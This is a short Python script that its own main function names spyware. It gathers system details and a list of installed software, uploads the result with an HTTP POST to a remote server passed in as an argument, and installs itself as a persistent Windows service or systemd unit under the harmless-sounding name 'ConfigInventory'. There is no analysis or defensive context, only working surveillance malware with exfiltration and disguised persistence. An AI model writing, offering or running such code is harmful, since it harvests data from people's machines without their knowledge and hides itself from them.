import os
import platform
import subprocess
import requests

def collect_system_info() -> dict:
    system_info = {
        'platform': platform.platform(),
        'architecture': platform.architecture(),
        'processor': platform.processor(),
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'node': platform.node(),
        'uname': platform.uname(),
        'installed_software': []
    }
    
    if platform.system() == 'Windows':
        try:
            result = subprocess.run(['wmic', 'product', 'get', 'name'], capture_output=True, text=True)
            system_info['installed_software'] = [line.strip() for line in result.stdout.splitlines()[1:] if line.strip()]
        except Exception as e:
            print(f"Error collecting installed software: {e}")
    else:
        try:
            result = subprocess.run(['dpkg', '-l'], capture_output=True, text=True)
            system_info['installed_software'] = [line.split()[1] for line in result.stdout.splitlines()[5:] if line.startswith('ii')]
        except Exception as e:
            print(f"Error collecting installed software: {e}")
    
    return system_info

def save_to_file(system_info: dict, output_file: str) -> None:
    with open(output_file, 'w') as f:
        for key, value in system_info.items():
            f.write(f"{key}: {value}\n")

def upload_to_server(output_file: str, remote_server: str) -> None:
    with open(output_file, 'rb') as f:
        files = {'file': (os.path.basename(output_file), f)}
        response = requests.post(remote_server, files=files)
        if response.status_code != 200:
            print(f"Failed to upload file: {response.status_code}")

def create_persistence() -> None:
    if platform.system() == 'Windows':
        try:
            subprocess.run(['sc', 'create', 'ConfigInventoryService', 'binPath=', 'C:\\path\\to\\your\\script.exe'])
        except Exception as e:
            print(f"Error creating persistence: {e}")
    else:
        try:
            with open('/etc/systemd/system/configinventory.service', 'w') as f:
                f.write('[Unit]\nDescription=Config Inventory Service\n[Service]\nExecStart=/path/to/your/script.sh\n[Install]\nWantedBy=multi-user.target\n')
            subprocess.run(['systemctl', 'enable', 'configinventory'])
        except Exception as e:
            print(f"Error creating persistence: {e}")

def spyware_system_config_inventory(output_file: str, remote_server: str) -> None:
    system_info = collect_system_info()
    save_to_file(system_info, output_file)
    upload_to_server(output_file, remote_server)
    create_persistence()
